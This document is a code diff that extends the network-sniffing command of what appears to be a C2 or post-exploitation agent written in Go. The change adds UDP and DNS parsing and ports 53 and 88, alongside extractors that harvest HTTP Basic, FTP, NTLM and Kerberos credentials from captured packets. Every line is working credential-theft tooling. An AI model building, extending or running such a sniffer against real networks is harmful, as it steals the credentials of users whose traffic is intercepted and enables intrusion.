@@ -48,7 +48,7 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 	if len(ports) == 0 {
-		ports = []uint16{21, 80, 110, 143, 389, 445, 8080}
+		ports = []uint16{21, 53, 80, 88, 110, 143, 389, 445, 8080}
 	}
 
 	ifaceName := params.Interface
@@ -155,14 +155,15 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 				pcapCollector.addPacket(packet)
 			}
 
-			// Parse Ethernet -> IPv4 -> TCP
+			// Parse Ethernet -> IPv4 -> TCP/UDP
 			if len(packet) >= 14 {
 				etherType := binary.BigEndian.Uint16(packet[12:14])
 				if etherType == 0x0800 {
 					ipData := packet[14:]
 					if len(ipData) >= 20 {
 						ihl := int(ipData[0]&0x0F) * 4
-						if ihl >= 20 && ihl <= len(ipData) && ipData[9] == 6 {
+						proto := ipData[9]
+						if ihl >= 20 && ihl <= len(ipData) && (proto == 6 || proto == 17) {
 							totalLen := int(binary.BigEndian.Uint16(ipData[2:4]))
 							if totalLen > len(ipData) {
 								totalLen = len(ipData)
@@ -171,38 +172,45 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 								SrcIP: net.IP(ipData[12:16]).String(),
 								DstIP: net.IP(ipData[16:20]).String(),
 							}
-							tcpData := ipData[ihl:totalLen]
-							if len(tcpData) >= 20 {
-								meta.SrcPort = binary.BigEndian.Uint16(tcpData[0:2])
-								meta.DstPort = binary.BigEndian.Uint16(tcpData[2:4])
-								dataOff := int(tcpData[12]>>4) * 4
-								if dataOff >= 20 && dataOff <= len(tcpData) {
-									payload := tcpData[dataOff:]
-									if len(payload) > 0 {
-										// Userspace port filter
-										portMatch := false
-										for _, p := range ports {
-											if meta.SrcPort == p || meta.DstPort == p {
-												portMatch = true
-												break
-											}
+							transportData := ipData[ihl:totalLen]
+							var payload []byte
+							if proto == 6 && len(transportData) >= 20 { // TCP
+								meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
+								meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
+								dataOff := int(transportData[12]>>4) * 4
+								if dataOff >= 20 && dataOff <= len(transportData) {
+									payload = transportData[dataOff:]
+								}
+							} else if proto == 17 && len(transportData) >= 8 { // UDP
+								meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
+								meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
+								payload = transportData[8:]
+							}
+							if len(payload) > 0 {
+								portMatch := false
+								for _, p := range ports {
+									if meta.SrcPort == p || meta.DstPort == p {
+										portMatch = true
+										break
+									}
+								}
+								if portMatch {
+									if cred := sniffExtractHTTPBasicAuth(payload, &meta); cred != nil {
+										result.Credentials = append(result.Credentials, cred)
+									}
+									if meta.DstPort == 21 || meta.SrcPort == 21 {
+										if cred := ftpTracker.process(payload, &meta); cred != nil {
+											result.Credentials = append(result.Credentials, cred)
 										}
-										if portMatch {
-											if cred := sniffExtractHTTPBasicAuth(payload, &meta); cred != nil {
-												result.Credentials = append(result.Credentials, cred)
-											}
-											if meta.DstPort == 21 || meta.SrcPort == 21 {
-												if cred := ftpTracker.process(payload, &meta); cred != nil {
-													result.Credentials = append(result.Credentials, cred)
-												}
-											}
-											if cred := sniffExtractNTLM(payload, &meta); cred != nil {
-												result.Credentials = append(result.Credentials, cred)
-											}
-											if cred := sniffExtractKerberos(payload, &meta); cred != nil {
-												result.Credentials = append(result.Credentials, cred)
-											}
-										}
+									}
+									if cred := sniffExtractNTLM(payload, &meta); cred != nil {
+										result.Credentials = append(result.Credentials, cred)
+									}
+									if cred := sniffExtractKerberos(payload, &meta); cred != nil {
+										result.Credentials = append(result.Credentials, cred)
+									}
+									if cred := sniffExtractDNS(payload, &meta); cred != nil {
+										result.Credentials = append(result.Credentials, cred)
 									}
 								}
 							}
